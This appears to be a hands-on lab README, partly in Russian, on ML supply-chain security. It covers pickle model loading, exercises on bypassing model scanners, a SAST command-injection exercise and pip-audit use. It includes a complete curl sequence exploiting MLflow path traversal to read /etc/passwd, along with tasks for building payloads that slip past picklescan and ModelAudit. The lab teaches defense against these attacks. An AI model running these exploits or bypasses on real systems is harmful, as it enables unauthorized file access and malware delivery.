# NLP Models — Hands-on Lab

In this lab you will load two pre-trained models and run inference locally. No
GPU required.

## Setup

Clone the repo and install dependencies:

```bash
git clone --depth 1 https://github.com/lainisourgod/sirius-supply-chain.git
cd sirius-supply-chain
uv sync
source .venv/bin/activate
```

## Part 1 — Sentiment Classifier

We have a fine-tuned Russian sentiment classifier published at
`alfa-nlp/sentiment-classifier-ru`. Load it:

```bash
python load_sentiment_model.py
```

The model architecture will be printed to stdout. Verify you see a
`Linear(768, 2)` layer — that is the classification head mapping BERT hidden
states to NEGATIVE / POSITIVE labels.

## Part 2 — Text Embedder

Next, load the text embedder checkpoint:

```bash
python load_embedder_model.py
```

## Questions to think about

- What does `trust_remote_code=True` do? When would you use it?
- Where do the model weights come from? Are they verified?
- What is `weights_only=False` in `torch.load`? What is the default and why was
  it changed?

---

# сканеры

### 🫣 PickleScan

```bash
picklescan -p sirius_text_embedder/pytorch_model.bin
```

### 🐬 ModelAudit

```bash
modelaudit scan sirius_text_embedder/pytorch_model.bin
```

- как вам разница?

### bypass #1: wrapper-ы в легитимных зависимостях

- придумай, как заабузить функцию
  `mlflow.project.backend.local._run_entry_point`

```python
def _run_entry_point(command, work_dir, experiment_id, run_id):
	env = os.environ.copy()
	env.update(get_run_env_vars(run_id, experiment_id))
	env.update(get_databricks_env_vars(tracking_uri=mlflow.get_tracking_uri()))

	if not is_windows():
    	process = subprocess.Popen(
		["bash", "-c", command], close_fds=True, cwd=work_dir, env=env
        )
	else:
		process = subprocess.Popen(
		["cmd", "/c", command], close_fds=True, cwd=work_dir, env=env
        )
	return LocalSubmittedRun(run_id, process)
```

- сравни выводы picklescan и modelaudit (оба зафейлились)

### а что найдет fickling?

- добавь в load_model.py до unpickle-а

```python
import fickling

fickling.hook.activate_safe_ml_environment()
```

куда-то еще вставить

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "sklearn.tree._classes.DecisionTreeClassifier",
    "custom_module.SafeClass",
])
```

---

### bypass #2: обфусцируем функции

- допиши функцию в build_2, чтобы использовала эксплойт со слайда

```bash
python scan_bypasses/build_2.py
python scan_bypasses/load_2.py
```

# mlflow

### 1. Запусти Docker-контейнер MLflow

```bash
docker run -p 5001:5000 ghcr.io/mlflow/mlflow:v2.5.0 mlflow server --host 0.0.0.0
```

### 2. Создай experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "artifact_location": "http:///?/../../../../../../../../../../../../../../etc/"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/experiments/create'
```

- experiment —
- _что делает очень много двоеточий?_
- _что такое etc?_

### 3. Создай run в experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"experiment_id": "{{EXPERIMENT_ID}}"}' \
    'http://127.0.0.1:5001/api/2.0/mlflow/runs/create'
```

### 4. Создай registered model

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/registered-models/create'
```

### 5. Привяжи registered model к run

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}' \
    'http://127.0.0.1:5001/ajax-api/2.0/mlflow/model-versions/create'
```

### ???

### 6. PROFIT. Прочитай /etc/passwd

```bash
curl 'http://127.0.0.1:5001/model-versions/get-artifact?path=passwd&name=poc&version=1'
```

# SAST/SCA

## базовое SAST-сканирование

- проведи аудит

```bash
bandit -r vibecoded_app/src/command_injection.py
```

- найди в этой простыне high уязу с `ping -c 4 {host}`
- попробуй запустить и разберись, как работает уязвимость:
  `python vibecoded_app/src/command_injection.py`
- пофикси через `subprocess`: `os.system` устарелое API
- проверь python код что эксплойт перестал работать
- запусти заново аудит, порадуйся что циферка уязвимостей уменьшилась 🙏

## базовое SCA-сканирование

```bash
pip-audit -r vibecoded_app/requirements.txt --no-deps --disable-pip
```

- попробуй найти в доке pip-audit команду для исправления

```bash
pip-audit -r vibecoded_app/requirements.txt --no-deps --disable-pip --fix
```
